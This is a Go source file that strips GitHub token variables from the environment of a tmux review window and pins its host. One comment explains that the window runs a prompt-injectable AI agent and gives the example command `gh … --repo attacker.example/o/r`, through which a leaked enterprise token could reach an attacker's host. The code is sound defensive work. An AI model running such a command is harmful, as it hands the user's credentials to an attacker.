package pr

import "strings"

// GHTokenEnvVars are the credential variables gh consults for a host. gh sends
// GH_ENTERPRISE_TOKEN / GITHUB_ENTERPRISE_TOKEN to whatever non-default host
// it is pointed at (GH_HOST, or a `--repo HOST/OWNER/REPO` operand), and
// GH_TOKEN / GITHUB_TOKEN to github.com and *.ghe.com. An empty value counts
// as unset: go-gh's tokenForHost takes a variable only when it is non-empty.
//
// It lives here rather than in internal/githubauth because githubauth imports
// this package and both apply the one rule: githubauth's pinned runner to its
// gh subprocesses, and this package to the review window's environment.
var GHTokenEnvVars = [4]string{"GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN", "GITHUB_ENTERPRISE_TOKEN"}

// GHTokenVarsToScrub returns the token variables a gh process pinned to host
// must not carry: none on github.com, and all four on any other host, which
// forces gh to the hosts.yml credential stored for that host by
// `gh auth login --hostname <host>`. The returned slice is fresh on every
// call, so a caller may append to it.
func GHTokenVarsToScrub(host string) []string {
	if host == defaultGitHubHost {
		return nil
	}
	return append([]string(nil), GHTokenEnvVars[:]...)
}

// pinReviewWindowEnv applies the gh host pin to a review window's environment
// entries (`KEY=VALUE`, as tmux new-window -e takes them). On github.com it
// returns env unchanged. On any other host it drops any GH_HOST or token
// entry env already carries, then sets GH_HOST=host and every token variable
// to empty. tmux new-window cannot unset a variable, and an empty value
// overrides whatever the tmux server's environment held.
//
// The review window runs a prompt-injectable agent, so this is the window-side
// half of forgectl#673: an ambient GH_ENTERPRISE_TOKEN in the window is what
// a `gh … --repo attacker.example/o/r` would carry to another host. The
// allow-list (allowlist.go) is the other half.
func pinReviewWindowEnv(env []string, host string) []string {
	scrub := GHTokenVarsToScrub(host)
	if scrub == nil {
		return env
	}
	drop := make(map[string]bool, len(scrub)+1)
	drop["GH_HOST"] = true
	for _, k := range scrub {
		drop[k] = true
	}
	pinned := make([]string, 0, len(env)+len(drop))
	for _, e := range env {
		key, _, _ := strings.Cut(e, "=")
		if drop[key] {
			continue
		}
		pinned = append(pinned, e)
	}
	pinned = append(pinned, "GH_HOST="+host)
	for _, k := range scrub {
		pinned = append(pinned, k+"=")
	}
	return pinned
}

// reviewWindowEnv is the environment a review window for sess is created
// with: the resolved window environment plus, for a remote PR, the gh host
// pin for that PR's host. A local session has no forge and its allow-list
// grants no gh at all, so it gets the resolved environment unchanged.
func (c *Client) reviewWindowEnv(sess Session) ([]string, error) {
	env, err := c.resolveWindowEnv()
	if err != nil {
		return nil, err
	}
	if sess.Ref.IsLocal() {
		return env, nil
	}
	host, _, err := c.prHost(sess.Ref)
	if err != nil {
		return nil, err
	}
	return pinReviewWindowEnv(env, host), nil
}
